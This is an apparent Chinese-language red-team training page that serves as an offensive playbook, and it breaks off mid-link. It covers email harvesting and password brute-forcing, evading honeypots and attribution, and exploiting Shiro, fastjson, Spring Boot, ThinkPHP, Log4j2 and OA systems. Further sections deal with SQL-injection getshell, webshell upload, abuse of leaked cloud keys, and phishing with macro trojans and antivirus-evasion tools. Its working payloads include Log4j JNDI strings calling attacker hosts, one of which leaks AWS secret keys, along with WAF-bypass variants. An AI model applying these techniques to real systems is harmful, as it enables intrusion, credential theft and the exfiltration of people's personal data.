<p>通过搜索引擎爬取<br>•Google hack 搜索；<br>•百度、搜狗、360、bing。<br>•site:target.com intitle:”Outlook Web App”<br>•site:target.com intitle:”mail”<br>•site:target.com intitle:”webmail”<br>•Shodan、fofa、zoomeye搜索等。</p>
<p>在绝大部分的网站的“联系我们”模块或者“关于我们”模块，或者是网站底部，通常都会存在一个邮箱联系方式。通过这个邮箱联系方式，攻击者就可以确定该组织使用的邮箱域名后缀，同时也可以推测邮箱前缀账号的格式。如下新浪首页的联系email为<a href="mailto:&#115;&#x69;&#x6e;&#x61;&#x63;&#115;&#99;&#x40;&#x76;&#105;&#x70;&#46;&#x73;&#x69;&#110;&#x61;&#46;&#99;&#110;">&#115;&#x69;&#x6e;&#x61;&#x63;&#115;&#99;&#x40;&#x76;&#105;&#x70;&#46;&#x73;&#x69;&#110;&#x61;&#46;&#99;&#110;</a>，攻击者通过该邮箱可以推测出两点：新浪联系邮箱的账号前缀为英文或者拼音；新浪联系邮箱的域名后缀为vip.sina.com。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160344899.png" alt="image-20220707160344899"></p>
<p>批量收集目标邮箱的一些常规途径<br>•<a target="_blank" rel="noopener" href="https://hunter.io/">https://hunter.io/</a><br>•<a target="_blank" rel="noopener" href="http://www.skymem.info/">http://www.skymem.info/</a><br>•<a target="_blank" rel="noopener" href="https://www.email-format.com/i/search/">https://www.email-format.com/i/search/</a><br>•<a target="_blank" rel="noopener" href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a><br>•<a target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a>  kali自带<br>•从搜索引擎、空间搜索引擎、社交、招聘网站等搜邮箱<br>•python3 theHarvester.py -d xxx.com -l 1000 -b all -f test.html</p>
<p>验证邮箱<br>在收集邮箱之后，我们要对邮箱进行验证，因为有些邮箱目标企业人员已经放弃或不用（离<br>职，职位调动等）。<br>(1)通过mailtester.com可以查询邮箱地址是否存在。<br>•<a target="_blank" rel="noopener" href="https://mailtester.com/testmail.php">https://mailtester.com/testmail.php</a></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/Tzeross/verifyemail">https://github.com/Tzeross/verifyemail</a></p>
<p>这里可以配合这个网址<a target="_blank" rel="noopener" href="https://www.aies.cn/pinyin.htm">https://www.aies.cn/pinyin.htm</a> 根据收集到的目标信息制定对应人名字典进行组合</p>
<p>邮箱爆破<br>这种方式的弱口令爆破只适用于目标企业自己的邮件服务器如owa等 像百度腾讯阿里网易的邮箱不优先考虑。用到的工具medusa、hydra、SNETCracker、APT34组织 owa爆破工具等。另外邮箱用户名与密码往往还会使用公司简称+2019，2020等社工口令，多一个字典就多一份成功率。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160530836.png" alt="image-20220707160530836"></p>
<p><strong>综合渗透框架</strong></p>
<p>•<a target="_blank" rel="noopener" href="https://github.com/lz520520/railgun">https://github.com/lz520520/railgun</a><br>Railgun为一款GUI界面的渗透工具，将部分人工经验转换为自动化，集成了渗透过程中常用到的一些功能，目前集成了端口扫描、端口爆破、web指纹扫描、漏洞扫描、漏洞利用以及编码转换功能，后续会持续更新。<br>•<a target="_blank" rel="noopener" href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a><br>一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C段IP等，<br>•<a target="_blank" rel="noopener" href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</p>
<p><strong>运用信息思路</strong></p>
<p>寻根溯源<br>一定要拿到真实 ip，渗透最终如果能 getshell 当然是最好的，只有拿到的 ip 是真实 ip，shell 写入的才是目标系统，才能获取重要的数据。而且，比较大的系统真实 ip 往往不唯一，甚至可能是完全不同的机房，信息收集的时候要注意甄别。真实 ip 扫出的端口和 banner 信息有利用的价值，CDN 分发的则没有，可以 get 的点明显少很多。在拿 ip 的过程中，尤其注意从 ip 的历史解析域名和域名的历史解析 ip 下手，全网扫描的 dns扫描工具比较多，除非从建站一开始就做好了 CDN，否则一定会有蛛丝马迹被记录到。可以说，信息收集最基础和最根本的就是找准真实 ip。</p>
<p>延长信息链<br>信息收集时，要注意把现有的信息链尽可能的延长，比如：</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707160718041.png" alt="image-20220707160718041"></p>
<p>在信息收集的全流程中，总能不断发现新的 ip 和域名，而新的 ip 和域名则可以发现新的敏感信息和内容，也可以用来反查历史解析和社工，实际操作的过程中，你会发现会越收集越多，信息网织起来越来越密，对目标的了解更加全面和深入。这样就不能等全部信息收集完再开始测试了，很多比较脆弱的资产有明显的特征，经验丰富的工程师比较容易识别出来比如：<br>•UI 设计比较过时和过于简单的页面<br>•搭建框架比较老旧的页面<br>•没有验证码、验证码过于简单或验证码没有生存期的页面<br>•数据参数过滤不严格的站点<br>•交互信息量比较大的站点…</p>
<h2 id="快-速-打-点-突-破"><a href="#快-速-打-点-突-破" class="headerlink" title="快 速 打 点 突 破"></a>快 速 打 点 突 破</h2><p><strong>介绍</strong></p>
<p>通常我们在hw行动中获得的通道管理权限是一个企业网站shell、vpn权限或是是根据社工方法获得到的终端设备管理权限，根据这一通道点深化撕掉口子进到局域网数据漫游。第一个环节要对总体目标的组织结构、it互联网资产、比较敏感数据泄露、供应商信息等各个领域开展搜集。攻防演练中得分项只关注两点，权限&amp;数据：权限类型分为系统权限和应用权限，权限高低又分为管理员权限和普通用户权限。数据一般是要四件套，姓名，手机号，身份证，住址。通常护网行动的总体目标企业为政府部门、国营企业、高等院校、医疗机构及其电力能源、电力工程、公共交通等重要信息内容基础设施建设企业。通常医疗机构和高等院校是比较好打的。</p>
<p>政府部门类企业由于归集化管理方法，尤其是企业网站基本上全部都是站群软件方法，由省市区的网络信息中心承担统建，统一化聚集布署在云数据中心服务平台上，各企业仅仅有着后台管理的应用管理权限。因此 针对政府部门类靶点我们一般把资产区划为:<br>•云数据中心代管类（通常为企业网站）<br>•已有计算机房类资产（通常为0A、电子邮箱、财务管理系统等里面协同办公系统及其VPN）<br>•外界代管资产（通常为微信小程序或是微信公众号）。</p>
<p>云数据中心代管类资产<br>通常省市区的网络信息中心全部都是巨资资金投入，从通道刚开始一长串机器设备（WAF、NGFW、三层交换机、DLP、进来以后也有天眼、EDR这类的），在战备值班期内每个机器设备生产商基本上都是会被拉回来二十四小时值班，因此 此类总体目标通常在比较有限时长内全部都是先绕开，确实搜集不上外面资产才绕过来硬刚。</p>
<p><strong>蜜罐介绍</strong></p>
<p>蜜罐可以理解为安全攻防中的陷阱，通过在信息系统中的各个环境或者网络中部署一些特定协议服务或者组件来诱导恶意行为对其进行探测或利用，从而达到发现恶意攻击、横向移动、内网失陷事件的目的。常见的蜜罐类型一般会包括以下几种：<br>•低交互式蜜罐 ：通常是指与操作系统交互程度较低的蜜罐系统，仅开放一些简单的服务或端口，用来检测扫描和连接，这种容易被识别。<br>•中交互式蜜罐 ：介于低交互式和高交互式之间，能够模拟操作系统更多的服务，让攻击者看起来更像一个真实的业务，从而对它发动攻击，这样蜜罐就能获取到更多有价值的信息。<br>•高交互式 ：指的是与操作系统交互很高的蜜罐，它会提供一个更真实的环境，这样更容易吸引入侵者，有利于掌握新的攻击手法和类型，但同样也会存在隐患，会对真实网络造成攻击<br>常见场景:<br>攻击队员通过社交工具传递目标可疑URL时，如果误点击通过系统默认的浏览器打开，则可能会被JSONP蜜罐捕获社交账号或者被抓到真实出口IP。</p>
<p>蜜罐简单识别<br>•网站是否存在大量请求其他域资源;<br>•网站是否对于各大社交网站发送请求；<br>•网站是否存在大量请求资源报错,克隆其他站时没有修改完成;<br>•存在⾮常多漏洞的站点，拿到shell后处于docker等虚拟环境，开放⼤量⾼危端⼝的;<br>•获取到PC机器后，PC机器⽤户⻓时间划⽔摸⻥;<br>•从目标获取的文件需要在沙箱或断网虚拟机运行，避免被反制</p>
<p><strong>反溯源</strong></p>
<p>作为应对，攻击方必须使用纯净的专用渗透环境进行攻击，完全与日常工作环境区分开来，并做测试环境的定期还原。<br>•VPN、匿名代理<br>•纯净的渗透环境、虚拟机<br>•匿名邮箱、手机号、VPS等<br>•纯净的移动设备、无线设备等</p>
<p>反jsonp蜜罐插件<br>判断当前网站域和jsonp接口的域是否是同一个，是的话就预警并阻断。<br>•<a target="_blank" rel="noopener" href="https://github.com/iiiusky/AntiHoneypot-Chrome-simple">https://github.com/iiiusky/AntiHoneypot-Chrome-simple</a><br>•<a target="_blank" rel="noopener" href="https://github.com/cnrstar/anti-honeypot">https://github.com/cnrstar/anti-honeypot</a></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161111167.png" alt="image-20220707161111167"></p>
<p><strong>概述</strong></p>
<p>攻防演练中得分项只关注两点，权限&amp;数据：权限类型分为系统权限和应用权限，权限高低又分为管理员权限和普通用户权限。数据一般是要四件套，姓名，手机号，身份证，住址。通常敏感数据这样定义，不过看当前的应用可能敏感信息的定义又会不同在攻防的时候，比的就是谁能发现弱点资产快，其实也是比三大块：<br>•0day利用<br>•1day利用<br>•常见WEB漏洞</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161156102.png" alt="image-20220707161156102"></p>
<hr>
<p><strong>弱口令</strong></p>
<p>系统的弱口令是常见的入口点之一，不论是web还是如VPN、堡垒机、边界路由器防火墙一类，以及结合特定公司场景、业务场景生成的弱口令的情况。可能存在未授权访问类的服务<br>•远程维护类服务（SSH、Tenlent、RDP 等）；<br>•数据库服务（MySQL、MSSQL、Oracle 、ES、MongoDB 等）；<br>•缓存类服务（Redis、Kafka）；<br>•大数据相关服务；<br>•云环境各类接口、Docker 环境各类接口；<br>•各种 Web 应用系统、手机程序、小程序等。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161237044.png" alt="image-20220707161237044"></p>
<p>密码组合方式<br>•有社工密码可以根据之前的密码使用历史记录针对性的生成组合。<br>•部门的密码使用习惯，趋于一致。<br>•有含义字符@有含义数字，如`姓名全拼@2017</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161259279.png" alt="image-20220707161259279"></p>
<p>弱口令的关键在于字典，一个好字典发挥的作用很可能超出预期，哪怕是边界网络设备的弱口令，也可能会打开直达内网的通路。比较推荐的一些字典：<br>•<a target="_blank" rel="noopener" href="https://github.com/fuzz-security/SuperWordlist">https://github.com/fuzz-security/SuperWordlist</a><br>•<a target="_blank" rel="noopener" href="https://github.com/insightglacier/Dictionary-Of-Pentesting">https://github.com/insightglacier/Dictionary-Of-Pentesting</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Stardustsky/SaiDict">https://github.com/Stardustsky/SaiDict</a><br>•<a target="_blank" rel="noopener" href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a><br>•<a target="_blank" rel="noopener" href="https://github.com/k8gege/PasswordDic">https://github.com/k8gege/PasswordDic</a><br>•<a target="_blank" rel="noopener" href="https://github.com/ybdt/dict-hub">https://github.com/ybdt/dict-hub</a><br>web通用弱口令破解脚本，旨在批量检测那些没有验证码的管理后台<br>•<a target="_blank" rel="noopener" href="https://github.com/TideSec/web_pwd_common_crack">https://github.com/TideSec/web_pwd_common_crack</a></p>
<p>爆破工具<br>Burp Intruder<br>•经常遇到一些客户端 js 文件对密码做加密处理发送给服务端的情况，推荐扩展<br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a><br>•验证码识别:<a target="_blank" rel="noopener" href="https://github.com/bit4woo/reCAPTCHA">https://github.com/bit4woo/reCAPTCHA</a><br>超级弱口令检查工具<br>•项目地址：<a target="_blank" rel="noopener" href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a><br>Hydra<br>•项目地址：<a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
<hr>
<p><strong>高危组件</strong></p>
<p>•struct2 (s2系列rce)<br>•thinkphp系列 (tp2x,3x,5x的代码执行等)<br>•shiro,fastjson组件反序列化<br>•Jekins (未授权访问，命令执行等)<br>•weblogic (CVE-2020-2551，CVE-2019-2729等)<br>•Jboss (反序列化CVE-2015-7501,CVE-2017-7504,CVE-2017-12149)<br>•各类开源cms的漏洞 (如wordpress，drupal ，discuz，joomla, 帝国cms，织梦cms等)<br>•常见编辑器的历史漏洞 (如ueditor编辑器解析漏洞，各种越权和后台地址泄露等)<br>•常见OA漏洞 (用友，泛微，致远，金蝶等)<br>•各种网关防火墙nday，redis未授权，mongodb未授权等</p>
<hr>
<p><strong>高危组件(Shiro)</strong></p>
<p>Shiro反序列化<br>shiro反序列化RCE是在实战中一个比较高频且舒适的漏洞，shiro框架在java web登录认证中广泛应用，每一次目标较多的情况下几乎都可以遇见shiro，而因其payload本身就是加密的，无攻击特征，所以几乎不会被waf检测和拦截。<br>shiro框架特征<br>•在请求包cookie中带有rememberMe=1字段<br>•在返回包的 Set-Cookie中存在rememberMe=deleteMe字段<br>Shiro主要漏洞方向：<br>•Shiro 反序列化 RCE<br>•Shiro 身份验证绕过<br>实战中可能遇到的问题：获得key&amp;回显&amp;内存shell</p>
<p>Shiro组件检测<br>•<a target="_blank" rel="noopener" href="https://github.com/pmiaowu/BurpShiroPassiveScan">https://github.com/pmiaowu/BurpShiroPassiveScan</a><br>•Fofa/hunter/quake<br>•指纹识别工具<br>利用：<br>•<a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a><br>•<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/shiro_rce_tool">https://github.com/wyzxxz/shiro_rce_tool</a><br>•<a target="_blank" rel="noopener" href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a><br>•<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
<p>Shiro 身份验证绕过<br>利用shiro解析uri和spring解析uri之间存在差异来绕过身份验证。URL中加/;/<br>•目标访问地址：/xxx/hello/aaaa<br>•发起请求地址：/;/xxx/hello/aaaa<br>如果能够知道后台各种接口的URL拼接即可绕过身份认证，未授权访问</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161537654.png" alt="image-20220707161537654"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161556728.png" alt="image-20220707161556728"></p>
<hr>
<p><strong>高危组件(fastjson)</strong></p>
<p>FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。在Java 8u102环境下，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p>
<p>探测：<br>用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。<br>•{“@type”:”java.net.URL”,”val”:”<a target="_blank" rel="noopener" href="http://dnslog&quot;}/">http://dnslog&quot;}</a><br>•{“@type”:”java.net.InetAddress”,”val”:”dnslog”}<br>•{“@type”:”java.net.Inet4Address”,”val”:”dnslog”}<br>利用:<br>•<a target="_blank" rel="noopener" href="https://github.com/pmiaowu/BurpFastJsonScan">https://github.com/pmiaowu/BurpFastJsonScan</a><br>•<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a><br>•<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit">https://github.com/feihong-cs/JNDIExploit</a></p>
<hr>
<p><strong>高危组件(Springboot)</strong></p>
<p>Spring Boot框架，作用很简单，就是帮我们自动配置，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。<br>Actuator是Spring Boot提供的服务监控和管理工具。当Spring Boot应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些敏感信息泄露。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161737987.png" alt="image-20220707161737987"></p>
<p>配置不当而暴露的路由<br>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置:<br>•<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints</a><br>•<a target="_blank" rel="noopener" href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt</a><br>探测:<br>•目录扫描工具+springboot字典<br>利用:<br>•<a target="_blank" rel="noopener" href="https://github.com/0x727/SpringBootExploit![image-20220707161816788](./HW%E8%AF%BE%E7%A8%8B/image-20220707161816788.png)">https://github.com/0x727/SpringBootExploit![image-20220707161816788](./HW%E8%AF%BE%E7%A8%8B/image-20220707161816788.png)</a></p>
<p>•/env、/actuator/envGET<br>请求 /env会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 /env接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。<br>•/refresh、/actuator/refreshPOST<br>请求 /env接口设置属性后，可同时配合 POST 请求/refresh接口刷新属性变量来触发相关 RCE 漏洞。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161900475.png" alt="image-20220707161900475"></p>
<p>•/restart、/actuator/restart<br>暴露出此接口的情况较少；可以配合 POST请求/env接口设置属性后，再 POST 请求 /restart接口重启应用来触发相关 RCE 漏洞。<br>•/jolokia、/actuator/jolokia<br>可以通过 /jolokia/list接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。<br>•/trace、/actuator/httptrace<br>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707161942288.png" alt="image-20220707161942288"></p>
<p>Sprint Boot漏洞<br>•whitelabel error page SpEL RCE<br>Env端点<br>•SpringBoot env 获取* 敏感信息<br>•spring Cloud env yaml利用<br>•xstream反序列化<br>Jolokia漏洞<br>•jolokia logback JNDI RCE<br>•jolokia Realm JNDI RCE<br>更多参考:<a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
<hr>
<p><strong>高危组件(thinkphp)</strong></p>
<p>ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache 2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。<img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162101727.png" alt="image-20220707162101727"></p>
<p>Thinkphp5 rce分两个大版本<br>•ThinkPHP 5.0-5.0.24<br>•ThinkPHP 5.1.0-5.1.30<br>方法主要分为两种:<br>•Request中的filter变量覆盖导致RCE分开启debug和不开启debug 两种情况<br>•路由控制不严谨导致的RCE<br>利用<br>•<a target="_blank" rel="noopener" href="https://github.com/Lotus6/ThinkphpGUI">https://github.com/Lotus6/ThinkphpGUI</a><br>•<a target="_blank" rel="noopener" href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a><br>•<a target="_blank" rel="noopener" href="https://github.com/bewhale/thinkphp_gui_tools">https://github.com/bewhale/thinkphp_gui_tools</a></p>
<hr>
<p><strong>高危组件(Log4j2)</strong></p>
<p>CVE-2021-44228(lookup JNDI 注入漏洞)<br>Apache Log4j是一个基于Java的日志记录组件。Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于${jndi:ldap://evil.com/example}的lookup用于进行JNDI注入，执行任意代码。Apache Log4j的默认配置支持JNDI（Java命名和目录接口）查询，可以执行由LDAP、RMI和DNS等远程服务提供的任意代码。<br>•受影响的版本：从2.0-beta9到2.12.1和2.13.0到2.14.1的所有版本</p>
<p>此次 Apache Log4j2 漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162223685.png" alt="image-20220707162223685"></p>
<p>Vulhub漏洞复现<br>•solr/admin/cores?action=${jndi:ldap://${sys:java.version}.n93jx9.ceye.io}</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162243795.png" alt="image-20220707162243795"></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220708223632385.png" alt="image-20220708223632385"></p>
<p>漏洞探测<br>项目地址：<a target="_blank" rel="noopener" href="https://github.com/fullhunt/log4j-scan">https://github.com/fullhunt/log4j-scan</a><br>使用方法<br>•python3 log4j-scan.py -h<br>•扫描单个URL<br>•python3 log4j-scan.py -u <a target="_blank" rel="noopener" href="https://xxx.com/">https://xxx.com</a><br>•使用所有请求方法扫描单个URL：GET、POST（URL 编码形式）、POST（JSON body）<br>•python3 log4j-scan.py -u <a target="_blank" rel="noopener" href="https://log4j.lab.secbot.local/">https://log4j.lab.secbot.local</a> –run-all-tests</p>
<p>BurpLog4j2Scan<br>•burpLog4j2Scan 是用 JAVA 编写的 Burp Suite 扩展，可用作扫描 log4j2rce。<br>•<a target="_blank" rel="noopener" href="https://github.com/tangxiaofeng7/BurpLog4j2Scan.git">https://github.com/tangxiaofeng7/BurpLog4j2Scan.git</a><br>Log4j2Scan<br>•<a target="_blank" rel="noopener" href="https://github.com/whwlsfb/Log4j2Scan.git">https://github.com/whwlsfb/Log4j2Scan.git</a><br>Log4j2 远程代码执行漏洞，BurpSuite被动扫描插件。支持精确提示漏洞参数、漏洞位置，支持多dnslog平台扩展、自动忽略静态文件。<br>漏洞检测暂只支持以下类型<br>•Url<br>•Cookie<br>•Header<br>•Body(x-www-form-urlencoded)</p>
<p>关键字绕过<br>•${jndi:dns://aeutbj.example.com/ext}<br>•${jndi:${lower:l}${lower:d}a${lower:p}://example.com/<br>•${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.mydogsbutt.com}<br>•iiop://这个协议老外发现但是未证实可用<br>转换大小写绕过<br>${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}<br>${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}</p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162351899.png" alt="image-20220707162351899"></p>
<hr>
<p><strong>OA系统</strong></p>
<p>•泛微(Weaver-Ecology-OA)<br>•致远(Seeyon)<br>•蓝凌OA<br>•通达OA(TongDa OA)<br>•红帆OA<br>•金和OA<br>•金蝶OA<br>•信呼OA<br>•…….</p>
<p>快速定位<br>•官网链接<br>•测绘引擎<br>•指纹识别<br>利用工具<br>•<a target="_blank" rel="noopener" href="https://github.com/xinyu2428/TDOA_RCE">https://github.com/xinyu2428/TDOA_RCE</a><br>•<a target="_blank" rel="noopener" href="https://github.com/Yang0615777/PocList">https://github.com/Yang0615777/PocList</a><br>•<a target="_blank" rel="noopener" href="https://github.com/z1un/weaver_exp">https://github.com/z1un/weaver_exp</a><br>•<a target="_blank" rel="noopener" href="https://github.com/haibara3839/LandrayExploit">https://github.com/haibara3839/LandrayExploit</a><br>•<a target="_blank" rel="noopener" href="https://github.com/asdasdqkq1/yonyou-nc-exp">https://github.com/asdasdqkq1/yonyou-nc-exp</a></p>
<p>以通达OA为例，常用到的小技巧:<br>•http[s]://TongDaOA.domain/inc/expired.php 判断通达版本<br>•http[s]://TongDaOA.domain/inc/reg_trial.php<br>•http[s]://TongDaOA.domain/inc/reg_trial_submit.php<br>•http[s]://TongDaOA.domain/resque/worker.php 计算机名<br>HW中常用到的漏洞:<br>•通达OA版本&lt;v11.5&amp;11.7任意用户登陆漏洞<br>•11.7后台SQL注入漏洞<br>•文件包含&amp;文件上传Getshell（慎用)<br>•redis+SSRF组合拳后台getshell<br>•文件上传.user.ini后台getshell（v11.8可用)</p>
<hr>
<p><strong>注入</strong></p>
<p>通过注入可以拓展很多思路，因为数据库基本上都实现了读写文件的操作，执行命令也可以通过拓展或者系统自带的存储过程来实现。限制我们的更多的是权限的问题.<br>•哪里会经常出现注入<br>•bypass waf<br>•如何快速定位重要数据表<br>•大数据表脱数据(慎重)<br>•注入读写文件<br>•执行命令<br>•站库分离情况<br>高校类的站点有很多Asp和PHP的网站，在登录、注册、查询功能处存在SQL注入漏洞可能性较大</p>
<p>bypass waf<br>关键在于需要清楚他拦截的是你payload的哪一部分<br>•<a target="_blank" rel="noopener" href="https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI">https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI</a><br>•<a target="_blank" rel="noopener" href="https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI">https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI</a><br>快速定位重要数据表<br>sqlmap有一个参数叫做–search，可以用来搜索列、表或数据库名称。<br>• –search -D：搜索某个数据库<br>• –search -T：搜索某个表名<br>• –search -C：搜索某个字段名<br>通过搜索形如username、password的字段即可快速定位重要数据表。</p>
<p>Mysql 的 getshell 方法<br>•SELECT…INTO OUTFILE<br>•general_log<br>•slow_query_log<br>•phpMyAdmin<br>Mssql的getshell方法<br>•xp_cmdshell拿shell<br>•差异备份拿shell<br>•log备份拿shell</p>
<hr>
<p><strong>通用文件上传</strong></p>
<p>需要注意的一些点<br>•判断服务器类型+脚本语言<br>•判断是否有waf<br>•准备免杀webshell<br>•找到上传的webshell路径<br>•使用合适的webshell管理工具进行连接</p>
<hr>
<p><strong>敏感信息泄露</strong></p>
<p>敏感信息包括但不限于：口令、密钥、证书、会话标识、License、隐私数据、授权凭据、个人数据等、程序文件、配置文件、日志文件、备份文件等<br>•robots.txt<br>•.git敏感文件<br>•物理路径泄露<br>•报错页面敏感信息泄漏<br>•备份文件泄露<br>•目录浏览<br>•其他</p>
<p><strong>敏感信息泄露(swagger）</strong></p>
<p>Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化RESTful 风格的 Web 服务<br>常见路径：<br>•/swagger-ui.html<br>•/swagger/swagger-ui.html<br>•/api/swagger-ui.html<br>•/v1.x/swagger-ui.html<br>•/swagger/index.html<br>利用参考： <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xQUnTXo38x_jLWv5beOQ0Q">https://mp.weixin.qq.com/s/xQUnTXo38x_jLWv5beOQ0Q</a></p>
<p><strong>敏感信息泄露(云key泄露）</strong></p>
<p>accesskey<br>访问密钥AccessKey（AK）相当于登录密码，只是使用场景不同。AccessKey用于程序方式调用云服务API，而登录密码用于登录控制台。<br>accesskey泄露主要有两种途径：<br>•硬编码在代码里<br>•Github<br>•前端js<br>•第三方存储<br>•Env<br>•Debug报错</p>
<p>利用方式<br><a target="_blank" rel="noopener" href="https://github.com/mrknow001/aliyun-accesskey-Tools">https://github.com/mrknow001/aliyun-accesskey-Tools</a><br><a target="_blank" rel="noopener" href="https://github.com/iiiusky/alicloud-tools">https://github.com/iiiusky/alicloud-tools</a><br>•./AliCloud-Tools -a <AccessKey> -s <SecretKey> ecs –list #查看所有实例信息</SecretKey></AccessKey></p>
<p><img src="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/image-20220707162838719.png" alt="image-20220707162838719"></p>
<p>通过云管平台获取权限<br>•用行云管家导入云主机，网站地址：<a target="_blank" rel="noopener" href="https://yun.cloudbility.com/">https://yun.cloudbility.com/</a></p>
<hr>
<p><strong>钓鱼邮件</strong></p>
<p>用伪装的电邮（不限于常见邮件，一些内部的oa，erp，或其他供员工使用交流带附件功能的系统亦可），附件携带excel宏病毒，或快捷方式类木马，亦或捆绑在正常软件中的木马等，发送给目标。<br>免杀推荐：<br><a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a><br><a target="_blank" rel="noopener" href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a><br>捆绑推荐：<br><a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/MatryoshkaDollTool">https://github.com/TheKingOfDuck/MatryoshkaDollTool</a><br>字典推荐：<br><a target="_blank" rel="noopener" href="https://github.com/sry309/SuperWordlist">https://github.com/sry309/SuperWordlist</a><br><a target="_blank" rel="noopener" 